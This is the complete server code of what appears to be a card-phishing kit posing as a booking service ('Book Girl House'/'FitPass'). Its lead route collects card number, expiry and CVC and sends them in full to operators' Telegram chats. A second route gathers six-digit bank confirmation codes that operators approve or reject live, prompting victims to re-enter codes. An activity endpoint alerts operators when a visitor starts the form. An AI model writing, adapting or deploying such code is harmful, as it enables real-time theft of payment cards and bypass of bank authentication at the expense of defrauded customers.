const express = require("express");
const session = require("express-session");
const helmet = require("helmet");
const path = require("path");
const crypto = require("crypto");
const { Redis } = require("@upstash/redis");

const app = express();
app.set("trust proxy", 1);
const PORT = process.env.PORT || 3000;

const ADMIN_USER = process.env.ADMIN_USER || "admin";
const ADMIN_PASS = process.env.ADMIN_PASS || (process.env.NODE_ENV === "production" ? "" : "change-me-now");
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString("hex");

// ========== Хранилище (Upstash Redis) ==========
// Нужны две переменные окружения:
// UPSTASH_REDIS_REST_URL
// UPSTASH_REDIS_REST_TOKEN
// Бесплатный аккаунт: https://console.upstash.com

let redis = null;
const LEADS_KEY = "fitpass:leads";

if (process.env.UPSTASH_REDIS_REST_URL && process.env.UPSTASH_REDIS_REST_TOKEN) {
  redis = new Redis({
    url: process.env.UPSTASH_REDIS_REST_URL,
    token: process.env.UPSTASH_REDIS_REST_TOKEN,
  });
  console.log("✓ Используем Upstash Redis");
} else {
  console.warn("⚠ UPSTASH_REDIS_REST_URL / TOKEN не заданы — данные будут только в памяти (пропадут при рестарте)");
}

// Fallback in-memory (на случай если Redis не настроен)
let memoryStore = [];

async function read() {
  if (redis) {
    try {
      const data = await redis.get(LEADS_KEY);
      return Array.isArray(data) ? data : [];
    } catch (e) {
      console.error("Redis read error:", e.message);
      return [];
    }
  }
  return memoryStore;
}

async function write(data) {
  if (redis) {
    try {
      await redis.set(LEADS_KEY, data);
      return;
    } catch (e) {
      console.error("Redis write error:", e.message);
    }
  }
  memoryStore = data;
}

const clean = (v) => String(v ?? "").trim().slice(0, 200);
const auth = (req, res, next) => (req.session.admin ? next() : res.status(401).json({ error: "Потрібен вхід" }));

app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: "100kb" }));
app.use(express.urlencoded({ extended: false }));
app.use(
  session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
      httpOnly: true,
      sameSite: "lax",
      secure: process.env.NODE_ENV === "production",
      maxAge: 8 * 60 * 60 * 1000,
    },
  })
);
app.use(express.static(path.join(__dirname, "public")));

// ========== Telegram ==========
const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TG_CHAT = process.env.TELEGRAM_CHAT_ID || "";

const https = require("https");

/** Generic Telegram Bot API call */
function tgApi(method, payload = {}) {
  return new Promise((resolve) => {
    if (!TG_TOKEN) return resolve(null);
    const data = JSON.stringify(payload);
    const req = https.request(
      {
        hostname: "api.telegram.org",
        path: `/bot${TG_TOKEN}/${method}`,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(data),
        },
      },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          try {
            resolve(JSON.parse(body));
          } catch {
            resolve(null);
          }
        });
      }
    );
    req.on("error", (e) => {
      console.error(`Telegram ${method} error:`, e.message);
      resolve(null);
    });
    req.write(data);
    req.end();
  });
}

async function sendTelegram(text, extra = {}) {
  if (!TG_TOKEN || !TG_CHAT) {
    console.log("Telegram: token or chat_id missing");
    return { ok: false, error: "missing token/chat" };
  }

  const chats = TG_CHAT.split(",").map((s) => s.trim()).filter(Boolean);
  if (chats.length === 0) {
    console.log("Telegram: no valid chat ids");
    return { ok: false, error: "no chats" };
  }

  const results = await Promise.all(
    chats.map(async (chatId) => {
      // chat_id can be number or string — Telegram accepts both
      const numericId = /^-?\d+$/.test(chatId) ? Number(chatId) : chatId;
      const payload = {
        chat_id: numericId,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
        ...extra,
      };
      const result = await tgApi("sendMessage", payload);
      if (!result?.ok) {
        console.error(`Telegram sendMessage FAILED [${chatId}]:`, JSON.stringify(result).slice(0, 300));
      } else {
        console.log(`Telegram sendMessage OK [${chatId}]`);
      }
      return result;
    })
  );

  const anyOk = results.some((r) => r?.ok);
  return { ok: anyOk, results };
}

/** Edit message text + remove/replace keyboard so buttons become inactive */
async function editTelegramMessage(chatId, messageId, text, replyMarkup = { inline_keyboard: [] }) {
  return tgApi("editMessageText", {
    chat_id: chatId,
    message_id: messageId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup: replyMarkup,
  });
}

// ========== Telegram webhook ==========
app.post("/api/telegram-webhook", express.json(), async (req, res) => {
  // Always respond 200 quickly so Telegram doesn't retry
  res.json({ ok: true });

  try {
    const update = req.body;
    console.log("TG webhook update keys:", Object.keys(update || {}));

    if (!update?.callback_query) return;

    const cb = update.callback_query;
    const data = (cb.data || "").trim();
    const from = cb.from || {};
    const name = from.first_name || from.username || "Хтось";
    const chatId = cb.message?.chat?.id;
    const messageId = cb.message?.message_id;
    const originalText = cb.message?.text || cb.message?.caption || "";

    console.log("TG callback:", { data, name, chatId, messageId });

    // 1) Answer IMMEDIATELY — otherwise button looks "dead" (spinner forever)
    let answerText = "OK";
    if (data === "online") answerText = "Ти на звʼязку ✓";
    else if (data.startsWith("take:")) answerText = "Взяв в роботу ✓";
    else if (data.startsWith("approve:")) answerText = "Код підтверджено ✓";
    else if (data.startsWith("reject:")) answerText = "Код відхилено";

    await tgApi("answerCallbackQuery", {
      callback_query_id: cb.id,
      text: answerText,
      show_alert: false,
    });

    // 2) Business logic
    let statusLine = "";

    if (data === "online") {
      statusLine = `\n\n🟢 <b>${name}</b> на звʼязку`;
      await sendTelegram(`🟢 <b>${name}</b> на звʼязку і готовий приймати дані.`);
    } else if (data.startsWith("take:")) {
      const leadId = data.split(":")[1];
      statusLine = `\n\n✅ <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу`;
      await sendTelegram(
        `🟢 <b>${name}</b> взяв заявку <b>#${leadId}</b> в роботу.\nВін на звʼязку і готовий обробляти.`
      );
    } else if (data.startsWith("approve:")) {
      const leadId = data.split(":")[1];
      try {
        const a = await read();
        const x = a.find((v) => Number(v.id) === Number(leadId));
        if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
          x.status = "Підтверджено";
          x.retry_requested = false;
          await write(a);
        }
      } catch (e) {
        console.error("approve lead error:", e.message);
      }
      statusLine = `\n\n✅ <b>${name}</b> підтвердив код`;
      await sendTelegram(`✅ <b>${name}</b> підтвердив код для заявки <b>#${leadId}</b>`);
    } else if (data.startsWith("reject:")) {
      const leadId = data.split(":")[1];
      try {
        const a = await read();
        const x = a.find((v) => Number(v.id) === Number(leadId));
        if (x && (x.status === "Очікує рішення менеджера" || x.status === "Ожидает решения менеджера")) {
          x.status = "Код не підійшов — повторне введення";
          x.rejected_code = x.submitted_code || null;
          x.rejected_at = new Date().toISOString();
          x.submitted_code = null;
          await write(a);
        }
      } catch (e) {
        console.error("reject lead error:", e.message);
      }
      statusLine = `\n\n❌ <b>${name}</b> відхилив код — клієнт може ввести новий`;
      await sendTelegram(
        `❌ <b>${name}</b> відхилив код для заявки <b>#${leadId}</b>\nКлієнт може ввести новий код.`
      );
    } else {
      console.log("Unknown callback data:", data);
    }

    // 3) Disable buttons on the original message
    if (chatId && messageId) {
      const newText = (originalText + statusLine).slice(0, 4096);

      // Try edit text + remove keyboard
      const editResult = await editTelegramMessage(chatId, messageId, newText, {
        inline_keyboard: [],
      });

      // Fallback: only remove keyboard if text edit failed
      if (!editResult?.ok) {
        console.log("editMessageText failed, trying editMessageReplyMarkup:", editResult);
        await tgApi("editMessageReplyMarkup", {
          chat_id: chatId,
          message_id: messageId,
          reply_markup: { inline_keyboard: [] },
        });
      }
    }
  } catch (e) {
    console.error("Webhook error:", e.message, e.stack);
  }
});

// ========== Set Telegram webhook ==========
app.get("/api/set-telegram-webhook", async (req, res) => {
  if (!TG_TOKEN) return res.json({ ok: false, error: "No token" });
  const url = `https://bookgirlhouse.com/api/telegram-webhook`;
  // drop_pending_updates helps after code changes
  const result = await tgApi("setWebhook", {
    url,
    drop_pending_updates: true,
    allowed_updates: ["callback_query", "message"],
  });
  const info = await tgApi("getWebhookInfo");
  res.json({ ok: !!result?.ok, set: result, info, webhook: url });
});

// ========== Webhook info (debug) ==========
app.get("/api/telegram-webhook-info", async (req, res) => {
  if (!TG_TOKEN) return res.json({ ok: false, error: "No token" });
  const info = await tgApi("getWebhookInfo");
  res.json({ ok: true, info });
});

// ========== Тест Telegram ==========
app.get("/api/test-telegram", async (req, res) => {
  const hasToken = !!TG_TOKEN;
  const hasChat = !!TG_CHAT;
  if (!hasToken || !hasChat) {
    return res.json({
      ok: false,
      message: "Missing env vars",
      hasToken,
      hasChat,
    });
  }
  const tg = await sendTelegram("✅ Тест від Book Girl House\nЯкщо ти це бачиш — Telegram працює.");
  res.json({
    ok: !!tg?.ok,
    message: tg?.ok ? "Test message sent" : "Telegram send failed — check logs / chat_id",
    telegram: tg,
  });
});

// ========== Активность (человек начал заполнять) ==========
app.post("/api/activity", async (req, res) => {
  try {
    const type = clean(req.body?.type) || "unknown";
    const page = clean(req.body?.page) || "";
    const service = clean(req.body?.service_type) || "";
    const msg =
      `👀 <b>Активність</b>\n` +
      `Тип: ${type}\n` +
      `Сторінка: ${page}\n` +
      `Послуга: ${service || "—"}\n` +
      `Час: ${new Date().toLocaleString("uk-UA")}`;

    const keyboard = {
      inline_keyboard: [[
        { text: "🟢 Я на звʼязку", callback_data: "online" },
      ]],
    };

    console.log("Activity ping:", { type, page, service, hasToken: !!TG_TOKEN, hasChat: !!TG_CHAT });
    const tg = await sendTelegram(msg, { reply_markup: keyboard });
    console.log("Activity telegram result:", JSON.stringify(tg).slice(0, 200));

    res.json({ ok: true, telegram: tg?.ok ?? false });
  } catch (e) {
    console.error("Activity error:", e.message);
    res.status(500).json({ error: "error", message: e.message });
  }
});

// ========== Создание заявки ==========
app.post("/api/leads", async (req, res) => {
  try {
    const name = clean(req.body.name) || "Не вказано";
    const email = clean(req.body.email) || "";
    const card_number = clean(req.body.card_number);
    const expiry = clean(req.body.expiry);
    const card_code = clean(req.body.card_code);
    const booking_date =
      clean(req.body.booking_date) ||
      new Intl.DateTimeFormat("ru-RU", { day: "numeric", month: "long" }).format(new Date());
    const booking_time = clean(req.body.booking_time);
    const service_type = clean(req.body.service_type) || "apartments";

    const digits = card_number.replace(/\D/g, "");
    const expiryMatch = expiry.match(/^(\d{2})\/(\d{2})$/);
    const expiryMonth = expiryMatch ? Number(expiryMatch[1]) : 0;
    const codeDigits = card_code.replace(/\D/g, "");

    const expiryYear = expiryMatch ? 2000 + Number(expiryMatch[2]) : 0;
    const now = new Date();
    const expired =
      expiryMatch &&
      (expiryYear < now.getFullYear() ||
        (expiryYear === now.getFullYear() && expiryMonth < now.getMonth() + 1));

    if (
      digits.length !== 16 ||
      !expiryMatch ||
      expiryMonth < 1 ||
      expiryMonth > 12 ||
      expired ||
      codeDigits.length !== 3 ||
      !booking_time
    ) {
      return res.status(400).json({
        error: expired
          ? "Термін дії картки вже минув."
          : "Перевірте номер картки, термін дії у форматі MM/YY та код із 3 цифр.",
      });
    }

    const a = await read();
    const id = a.length ? Math.max(...a.map((x) => Number(x.id) || 0)) + 1 : 1;

    a.unshift({
      id,
      name,
      email,
      card_number: digits,
      expiry,
      card_code: codeDigits,
      booking_date,
      booking_time,
      booking: `${booking_date} · ${booking_time}`,
      service_type,
      status: "Очікує введення коду",
      submitted_code: null,
      attempts: 0,
      last_attempt_at: null,
      retry_requested: false,
      retry_requested_at: null,
      created_at: new Date().toISOString(),
    });

    await write(a);

    // Telegram: новая заявка with button
    const cardMasked = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    const tgMsg = `💳 <b>Нова заявка #${id}</b>\n` +
      `Послуга: <b>${service_type}</b>\n` +
      `Імʼя: ${name}\n` +
      `Email: ${email || "—"}\n` +
      `Картка: <code>${cardMasked}</code>\n` +
      `Термін: ${expiry}\n` +
      `CVC: <code>${codeDigits}</code>\n` +
      `Час: ${booking_time}\n` +
      `Статус: очікує код`;

    const keyboard = {
      inline_keyboard: [[
        { text: "✅ Взяв в роботу", callback_data: `take:${id}` }
      ]]
    };

    await sendTelegram(tgMsg, { reply_markup: keyboard });

    res.json({ ok: true, id });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Статус заявки (для клиента) ==========
app.get("/api/leads/:id/status", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    res.json({
      id: x.id,
      status: x.status,
      attempts: x.attempts || 0,
      last_attempt_at: x.last_attempt_at || null,
      retry_requested: !!x.retry_requested,
      retry_requested_at: x.retry_requested_at || null,
    });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Клиент отправил код ==========
app.post("/api/leads/:id/submit-code", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    const code = clean(req.body.code).replace(/\D/g, "");

    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    if (x.status === "Підтверджено" || x.status === "Подтверждено") return res.status(409).json({ error: "Цю заявку вже підтверджено" });
    if (code.length !== 6) return res.status(400).json({ error: "Код має містити рівно 6 цифр" });

    x.submitted_code = code;
    x.attempts = (x.attempts || 0) + 1;
    x.last_attempt_at = new Date().toISOString();
    x.retry_requested = false;
    x.retry_requested_at = null;
    x.status = "Очікує рішення менеджера";

    await write(a);

    const codeMsg =
      `🔐 <b>Код від клієнта #${x.id}</b>\n` +
      `Код: <code>${code}</code>\n` +
      `Спроба: ${x.attempts}\n` +
      `Послуга: ${x.service_type || "—"}\n` +
      `Імʼя: ${x.name || "—"}\n` +
      `Картка: <code>${(x.card_number || "").replace(/(\d{4})(?=\d)/g, "$1 ")}</code>`;

    const codeKeyboard = {
      inline_keyboard: [
        [
          { text: "✅ Підтвердити", callback_data: `approve:${x.id}` },
          { text: "❌ Відхилити", callback_data: `reject:${x.id}` },
        ],
      ],
    };

    await sendTelegram(codeMsg, { reply_markup: codeKeyboard });

    res.json({ ok: true, status: x.status, attempts: x.attempts });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Клиент просит новый код ==========
app.post("/api/leads/:id/request-retry", async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });
    if (x.status !== "Код не підійшов — повторне введення" && x.status !== "Очікує введення коду" && x.status !== "Код не подошёл — повторный ввод" && x.status !== "Ожидает ввода кода") {
      return res.status(400).json({ error: "Повторне надсилання зараз недоступне" });
    }

    x.submitted_code = null;
    x.retry_requested = true;
    x.retry_requested_at = new Date().toISOString();
    x.status = "Клієнт запросив новий код";

    await write(a);
    res.json({ ok: true, status: x.status, attempts: x.attempts || 0 });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Логин ==========
app.post("/api/login", (req, res) => {
  if (!ADMIN_PASS) {
    return res.status(503).json({
      error: "Адміністратора не налаштовано. Додайте ADMIN_PASS у Environment Variables на Render.",
    });
  }
  if (req.body.username === ADMIN_USER && req.body.password === ADMIN_PASS) {
    req.session.admin = true;
    return res.json({ ok: true });
  }
  res.status(401).json({ error: "Невірний логін або пароль" });
});

app.post("/api/logout", (req, res) => req.session.destroy(() => res.json({ ok: true })));
app.get("/api/me", (req, res) => res.json({ authenticated: !!req.session.admin }));

// ========== Список заявок (админка) ==========
app.get("/api/leads", auth, async (req, res) => {
  try {
    res.json(await read());
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Решение менеджера ==========
app.post("/api/leads/:id/decision", auth, async (req, res) => {
  try {
    const a = await read();
    const x = a.find((v) => Number(v.id) === Number(req.params.id));
    const decision = clean(req.body.decision);
    if (!x) return res.status(404).json({ error: "Заявку не знайдено" });

    if (decision === "approve") {
      if (x.status !== "Очікує рішення менеджера" && x.status !== "Ожидает решения менеджера") {
        return res.status(400).json({ error: "Зараз немає коду на перевірці" });
      }
      x.status = "Підтверджено";
      x.retry_requested = false;
    } else if (decision === "reject") {
      if (x.status !== "Очікує рішення менеджера" && x.status !== "Ожидает решения менеджера") {
        return res.status(400).json({ error: "Зараз немає коду на перевірці" });
      }
      x.status = "Код не підійшов — повторне введення";
      x.rejected_code = x.submitted_code || null;
      x.rejected_at = new Date().toISOString();
      x.submitted_code = null;
    } else {
      return res.status(400).json({ error: "Недопустиме рішення" });
    }

    await write(a);
    res.json({ ok: true, status: x.status });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

// ========== Удаление заявки ==========
app.delete("/api/leads/:id", auth, async (req, res) => {
  try {
    const a = await read();
    await write(a.filter((v) => Number(v.id) !== Number(req.params.id)));
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: "Помилка сервера" });
  }
});

if (require.main === module) {
  app.listen(PORT, () => console.log(`FitPass running on http://localhost:${PORT}`));
}

module.exports = app;
